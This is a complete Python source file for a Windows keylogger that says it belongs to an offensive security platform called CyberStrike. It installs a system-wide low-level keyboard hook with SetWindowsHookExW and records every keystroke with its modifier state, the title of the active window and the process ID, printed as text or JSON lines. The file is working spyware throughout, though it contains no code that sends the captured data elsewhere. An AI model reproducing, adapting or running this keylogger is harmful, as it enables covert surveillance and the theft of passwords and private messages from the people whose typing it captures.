#!/usr/bin/env python3
"""
keylog_win.py - Capture keystrokes via SetWindowsHookEx on Windows.

Installs a low-level keyboard hook (WH_KEYBOARD_LL) using user32.dll to
intercept all keystrokes system-wide. Captures active window title, modifier
key states, and the foreground process PID for each keystroke event.

Requires: Administrator privileges on Windows.

Part of CyberStrike offensive security platform.
"""

import argparse
import ctypes
import ctypes.wintypes
import json
import os
import signal
import sys
import time
from datetime import datetime


# --- Windows constants ---

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

HC_ACTION = 0

VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_MENU = 0x12       # Alt key
VK_LSHIFT = 0xA0
VK_RSHIFT = 0xA1
VK_LCONTROL = 0xA2
VK_RCONTROL = 0xA3
VK_LMENU = 0xA4
VK_RMENU = 0xA5
VK_CAPITAL = 0x14

# Special key names
SPECIAL_KEYS = {
    0x08: "BACKSPACE",
    0x09: "TAB",
    0x0D: "ENTER",
    0x1B: "ESC",
    0x20: "SPACE",
    0x21: "PAGE_UP",
    0x22: "PAGE_DOWN",
    0x23: "END",
    0x24: "HOME",
    0x25: "LEFT",
    0x26: "UP",
    0x27: "RIGHT",
    0x28: "DOWN",
    0x2C: "PRINT_SCREEN",
    0x2D: "INSERT",
    0x2E: "DELETE",
    0x5B: "LWIN",
    0x5C: "RWIN",
    0x70: "F1",
    0x71: "F2",
    0x72: "F3",
    0x73: "F4",
    0x74: "F5",
    0x75: "F6",
    0x76: "F7",
    0x77: "F8",
    0x78: "F9",
    0x79: "F10",
    0x7A: "F11",
    0x7B: "F12",
    0x90: "NUM_LOCK",
    0x91: "SCROLL_LOCK",
}


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]


# Callback type for SetWindowsHookExW
HOOKPROC = ctypes.WINFUNCTYPE(
    ctypes.c_long,
    ctypes.c_int,
    ctypes.wintypes.WPARAM,
    ctypes.wintypes.LPARAM,
)


class WinKeylogger:
    """Captures keystrokes via SetWindowsHookEx (WH_KEYBOARD_LL)."""

    def __init__(self, duration=None, json_output=False):
        self.duration = duration
        self.json_output = json_output
        self.running = True
        self.hook_handle = None
        self.event_count = 0
        self.start_time = None
        self.user32 = None
        self.kernel32 = None
        self._hook_proc_ref = None  # prevent garbage collection

    def check_admin(self):
        """Verify the script is running with Administrator privileges."""
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except AttributeError:
            is_admin = False
        if not is_admin:
            print(
                "ERROR: keylog_win.py requires Administrator privileges.",
                file=sys.stderr,
            )
            sys.exit(1)

    def print_banner(self):
        print("=" * 70)
        print("  keylog_win.py - Keystroke Logger (Windows)")
        print("=" * 70)
        print(f"  PID:         {os.getpid()}")
        print(f"  Hook:        WH_KEYBOARD_LL (SetWindowsHookExW)")
        print(f"  JSON output: {self.json_output}")
        if self.duration:
            print(f"  Duration:    {self.duration}s")
        else:
            print("  Duration:    unlimited (Ctrl+C to stop)")
        print("=" * 70)
        print()

    def signal_handler(self, signum, frame):
        self.running = False

    def _load_libraries(self):
        """Load user32.dll and kernel32.dll references."""
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32

        # Set argument/return types for API calls
        self.user32.SetWindowsHookExW.argtypes = [
            ctypes.c_int,
            HOOKPROC,
            ctypes.wintypes.HINSTANCE,
            ctypes.wintypes.DWORD,
        ]
        self.user32.SetWindowsHookExW.restype = ctypes.c_void_p

        self.user32.CallNextHookEx.argtypes = [
            ctypes.c_void_p,
            ctypes.c_int,
            ctypes.wintypes.WPARAM,
            ctypes.wintypes.LPARAM,
        ]
        self.user32.CallNextHookEx.restype = ctypes.c_long

        self.user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
        self.user32.UnhookWindowsHookEx.restype = ctypes.wintypes.BOOL

        self.user32.GetMessageW.argtypes = [
            ctypes.POINTER(ctypes.wintypes.MSG),
            ctypes.wintypes.HWND,
            ctypes.wintypes.UINT,
            ctypes.wintypes.UINT,
        ]
        self.user32.GetMessageW.restype = ctypes.wintypes.BOOL

        self.user32.GetForegroundWindow.argtypes = []
        self.user32.GetForegroundWindow.restype = ctypes.wintypes.HWND

        self.user32.GetWindowTextW.argtypes = [
            ctypes.wintypes.HWND,
            ctypes.wintypes.LPWSTR,
            ctypes.c_int,
        ]
        self.user32.GetWindowTextW.restype = ctypes.c_int

        self.user32.GetWindowThreadProcessId.argtypes = [
            ctypes.wintypes.HWND,
            ctypes.POINTER(ctypes.wintypes.DWORD),
        ]
        self.user32.GetWindowThreadProcessId.restype = ctypes.wintypes.DWORD

        self.user32.GetKeyState.argtypes = [ctypes.c_int]
        self.user32.GetKeyState.restype = ctypes.c_short

        self.user32.GetKeyNameTextW.argtypes = [
            ctypes.c_long,
            ctypes.wintypes.LPWSTR,
            ctypes.c_int,
        ]
        self.user32.GetKeyNameTextW.restype = ctypes.c_int

    def _get_foreground_info(self):
        """Return the active window title and its process PID."""
        hwnd = self.user32.GetForegroundWindow()
        if not hwnd:
            return "", 0

        # Get window title
        title_buf = ctypes.create_unicode_buffer(512)
        self.user32.GetWindowTextW(hwnd, title_buf, 512)
        title = title_buf.value

        # Get process ID
        pid = ctypes.wintypes.DWORD(0)
        self.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))

        return title, pid.value

    def _get_modifiers(self):
        """Return a list of currently pressed modifier keys."""
        modifiers = []
        if self.user32.GetKeyState(VK_CONTROL) & 0x8000:
            modifiers.append("CTRL")
        if self.user32.GetKeyState(VK_SHIFT) & 0x8000:
            modifiers.append("SHIFT")
        if self.user32.GetKeyState(VK_MENU) & 0x8000:
            modifiers.append("ALT")
        if self.user32.GetKeyState(VK_CAPITAL) & 0x0001:
            modifiers.append("CAPSLOCK")
        return modifiers

    def _get_key_name(self, vk_code, scan_code):
        """Resolve virtual key code to a human-readable name."""
        if vk_code in SPECIAL_KEYS:
            return SPECIAL_KEYS[vk_code]

        # Try GetKeyNameTextW for printable characters
        lparam = (scan_code << 16)
        name_buf = ctypes.create_unicode_buffer(64)
        result = self.user32.GetKeyNameTextW(lparam, name_buf, 64)
        if result > 0:
            return name_buf.value

        # Fallback: printable ASCII range
        if 0x30 <= vk_code <= 0x5A:
            return chr(vk_code)

        return f"VK_0x{vk_code:02X}"

    def _log(self, message, level="info", **extra):
        if self.json_output:
            payload = {"level": level, "message": message, "timestamp": time.time()}
            payload.update(extra)
            print(json.dumps(payload), flush=True)
        else:
            print(f"[keylog_win] {message}", flush=True)

    def _keyboard_hook_callback(self, nCode, wParam, lParam):
        """Low-level keyboard hook callback — processes WM_KEYDOWN events."""
        if nCode == HC_ACTION and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            self.event_count += 1

            vk_code = kb.vkCode
            scan_code = kb.scanCode
            key_name = self._get_key_name(vk_code, scan_code)
            modifiers = self._get_modifiers()
            window_title, pid = self._get_foreground_info()
            timestamp = datetime.now().isoformat()

            if self.json_output:
                record = {
                    "level": "keystroke",
                    "timestamp": timestamp,
                    "key": key_name,
                    "vk_code": vk_code,
                    "scan_code": scan_code,
                    "modifiers": modifiers,
                    "window_title": window_title,
                    "pid": pid,
                    "count": self.event_count,
                }
                print(json.dumps(record), flush=True)
            else:
                mod_str = "+".join(modifiers) if modifiers else "none"
                print(
                    f"[{timestamp}] KEY={key_name:<16} "
                    f"MOD={mod_str:<20} "
                    f"PID={pid:<8} "
                    f"WIN={window_title[:60]}",
                    flush=True,
                )

            # Check duration limit
            if self.duration is not None and self.start_time is not None:
                elapsed = time.monotonic() - self.start_time
                if elapsed >= self.duration:
                    self.running = False
                    # Post WM_QUIT to break the message loop
                    self.user32.PostQuitMessage(0)

        return self.user32.CallNextHookEx(self.hook_handle, nCode, wParam, lParam)

    def run(self):
        """Install the keyboard hook and pump messages until stopped."""
        self.check_admin()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self._load_libraries()
        self.start_time = time.monotonic()

        # Create the hook callback (must keep a reference to prevent GC)
        self._hook_proc_ref = HOOKPROC(self._keyboard_hook_callback)

        self.hook_handle = self.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            self._hook_proc_ref,
            None,
            0,
        )

        if not self.hook_handle:
            error = ctypes.GetLastError()
            self._log(
                f"SetWindowsHookExW failed with error {error}",
                level="error",
            )
            sys.exit(1)

        duration_msg = f" for {self.duration} seconds" if self.duration else ""
        self._log(
            f"Keyboard hook installed{duration_msg}. Capturing keystrokes...",
            level="info",
            status="active",
            duration=self.duration,
        )
        if not self.duration:
            self._log("Press Ctrl+C to stop.")

        if not self.json_output:
            print(
                f"{'TIMESTAMP':<28} {'KEY':<20} "
                f"{'MODIFIERS':<24} {'PID':<12} {'WINDOW'}"
            )
            print("-" * 120)

        # Message pump — required for low-level hooks to function
        msg = ctypes.wintypes.MSG()
        while self.running:
            result = self.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            if result == 0 or result == -1:
                break

        self.cleanup()

    def cleanup(self):
        """Unhook the keyboard hook and print summary."""
        if self.hook_handle:
            self.user32.UnhookWindowsHookEx(self.hook_handle)
            self.hook_handle = None

        elapsed = 0.0
        if self.start_time:
            elapsed = time.monotonic() - self.start_time

        print(f"\n--- keylog_win summary ---")
        print(f"Captured {self.event_count} keystroke event(s)")
        print(f"Duration: {elapsed:.1f}s")
        print("Hook removed. Exiting.")


def main():
    parser = argparse.ArgumentParser(
        description="Capture keystrokes via SetWindowsHookEx (WH_KEYBOARD_LL) with "
        "active window tracking and modifier key detection.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 keylog_win.py\n"
            "  python3 keylog_win.py --duration 60\n"
            "  python3 keylog_win.py --duration 300 --json-output\n"
        ),
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=None,
        metavar="SECONDS",
        help="Capture duration in seconds. If not specified, runs until Ctrl+C.",
    )
    parser.add_argument(
        "--json-output",
        action="store_true",
        default=False,
        help="Output keystroke events as JSON lines for structured consumption.",
    )
    args = parser.parse_args()

    if args.duration is not None and args.duration <= 0:
        print("Error: Duration must be a positive integer.", file=sys.stderr)
        sys.exit(1)

    keylogger = WinKeylogger(duration=args.duration, json_output=args.json_output)
    keylogger.run()


if __name__ == "__main__":
    main()
